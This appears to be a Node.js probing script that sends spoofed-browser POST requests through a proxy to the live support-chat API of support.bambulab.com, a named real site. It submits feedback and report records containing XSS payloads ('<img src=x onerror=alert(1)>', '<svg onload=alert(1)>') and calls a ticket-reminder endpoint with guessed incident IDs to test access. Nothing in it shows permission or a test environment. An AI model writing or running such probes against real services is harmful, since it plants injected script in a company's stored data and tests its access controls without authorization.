const {ProxyAgent,fetch}=require('undici');
const d=new ProxyAgent(process.env.HTTPS_PROXY||'http://127.0.0.1:7890');
const B='https://support.bambulab.com';
const UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';
const marker='PROBE-'+Math.random().toString(36).slice(2,10);
function H(){return {'content-type':'application/json',origin:B,referer:B+'/liveChat','user-agent':UA,'x-robot-user':marker,'x-bbl-official-site-region':'EN'};}
async function post(path,body,label){try{const r=await fetch(B+path,{method:'POST',headers:H(),body:JSON.stringify(body),dispatcher:d,signal:AbortSignal.timeout(15000)});const t=await r.text();console.log(r.status,label,'|',t.slice(0,300).replace(/\s+/g,' '));}catch(e){console.log('ERR',label,e.message)}}
(async()=>{
 await post('/gw/robot/front/feedback',{feedback:'test feedback '+marker,origin:1,userId:marker,sessionId:marker,email:'test@example.com',feedbackType:1,knowledgeId:'x',requestId:'clientID_text_'+marker,messageSource:'ai'},'feedback-valid');
 await post('/gw/robot/front/feedback',{feedback:'<img src=x onerror=alert(1)> '+marker,origin:1,userId:marker,sessionId:marker,email:'test@example.com',feedbackType:1,requestId:'clientID_text_'+marker},'feedback-xss');
 await post('/gw/robot/front/report',{userId:marker,sessionId:marker,requestId:'clientID_text_'+marker,reportReason:1,reportDetail:'test report '+marker,messageContent:'test message',extendField4:marker,origin:1},'report-valid');
 await post('/gw/robot/front/report',{userId:marker,sessionId:marker,requestId:'clientID_text_'+marker,reportReason:1,reportDetail:'<img src=x onerror=alert(1)> '+marker,messageContent:'<svg onload=alert(1)>',extendField4:marker,origin:1},'report-xss');
 await post('/gw/robot/ticket/reminder',{incidentId:'1'},'reminder-1');
 await post('/gw/robot/ticket/reminder',{incidentId:'999999999999999999'},'reminder-big');
})();
